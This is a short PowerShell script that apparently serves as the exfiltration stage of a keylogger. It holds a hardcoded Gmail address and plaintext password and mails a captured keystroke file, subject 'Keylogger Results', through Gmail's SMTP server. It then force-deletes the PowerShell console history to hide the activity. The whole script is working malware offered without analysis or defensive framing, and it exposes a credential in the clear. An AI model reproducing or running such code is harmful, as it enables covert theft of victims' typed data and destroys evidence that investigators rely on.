$From = "madman1237890026525@gmail.com"
$Pass = "Madman009"
$To = "madman1237890026525@gmail.com"
$Subject = "Keylogger Results"
$body = "Keylogger Results"
$SMTPServer = "smtp.gmail.com"
$SMTPPort = "587"
$credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
$Path="C:\Intel\Car.txt"

$Pathe="$env:Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
send-mailmessage -from $from -to $to -subject $Subject -body $body -Attachment $Path -smtpServer $smtpServer -port $SMTPPort -credential $credentials -usessl
Remove-Item -Path $Pathe -force

